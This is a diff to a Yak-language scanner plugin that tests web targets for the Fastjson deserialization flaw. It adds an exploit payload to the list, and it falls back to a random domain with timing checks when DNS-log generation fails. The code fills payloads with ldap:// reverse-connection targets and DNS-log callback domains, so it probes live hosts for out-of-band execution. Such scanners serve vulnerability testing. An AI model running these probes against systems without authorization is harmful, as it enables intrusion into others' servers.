@@ -232,8 +232,10 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                     log.debug("添加payload: %v", varName)
                     exps.Append(expMap.$varName)
                 }else{ // versionScope[1] > v
+                    exps.Append(expMap.exp_1243)
                     exps.Append(expMap.exp_1268)
                     exps.Append(expMap.exp_1283)
+                    log.debug("添加payload: exp_1243")
                     log.debug("添加payload: exp_1268")
                     log.debug("添加payload: exp_1283")
                 }
@@ -250,7 +252,11 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                 dnslog1Prefix = randstr(5)
                 dnslog2Prefix = randstr(5)
                 for exp in exps{
-                    exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%v.%s"%[dnslog1Prefix,domain],"dnslog2":"%v.%s"%[dnslog2Prefix,domain]})
+                    if checkDns{
+                        exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%s"%[domain],"dnslog2":"%s"%[domain]})
+                    }else{
+                        exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%v.%s"%[dnslog1Prefix,domain],"dnslog2":"%v.%s"%[dnslog2Prefix,domain]})
+                    }
                     if len(exp) == 0{
                         continue
                     }
@@ -322,7 +328,7 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         }
     }else{ // fuzz body
         if reqIsJson{
-            body = getBody(req)
+            body = getBody(rsp)
             res = {"value":string(body),"fuzz":(payload)=>{
                 return freq.FuzzPostRaw(payload)
             },"name":"[body]","isBody":true}
@@ -400,13 +406,16 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         // 上一个步骤已经可以得知出网信息、常规请求时长信息
         // 反连检测（这个步骤可以获取比较准确的出网情况）
         v, ok = globalInfo.Load("isFastjson")
-        if (!ok || ok && v!=1) && !hasCriticalRisk(){
+        if (!ok || ok && v!=-1) && !hasCriticalRisk(){
             log.debug("开始出网检测")
             for param in needToFuzzParams{
                 for poc in dnslogPocs{
+                    checkDns = true
                     domain,token,err = risk.NewDNSLogDomain()
-                    if err{
-                        continue
+                    if err{ // 如果获取dnslog失败则尝试使用错误的地址延迟测试
+                        yakit.Error("生成 dnslog error: %v", err)
+                        checkDns = false
+                        domain = x"{{randstr}}.{{randstr}}.com"
                     }
                     poc = fuzz.StringsWithParam(poc, {"dnslog":domain})
                     if len(poc) != 1{
@@ -414,17 +423,13 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                     }
                     poc = poc[0]
                     rsp,err = param.delayFuzz(poc)
-                    if err{
-                        continue
-                    }
-                    res,err = risk.CheckDNSLogByToken(token, dnslogTimeout)
-                    if err{
-                        continue
-                    }
-                    if len(res)>0{
-                        globalInfo.Store("outNet",1)
-                        newRisk("目标 fastjson 框架存在 dnslog 回显",poc,param,0)
-                        break
+                    if checkDns{
+                        res,err = risk.CheckDNSLogByToken(token, dnslogTimeout)
+                        if len(res)>0{
+                            globalInfo.Store("outNet",1)
+                            newRisk("目标 fastjson 框架存在 dnslog 回显",poc,param,0)
+                            break
+                        }
                     }
                     wastTime = rsp.DurationMs/1000.0
                     if wastTime - getCommonWastTime() > timeoutTolerance{ // 如果dnslog查询失败会进行延时检测
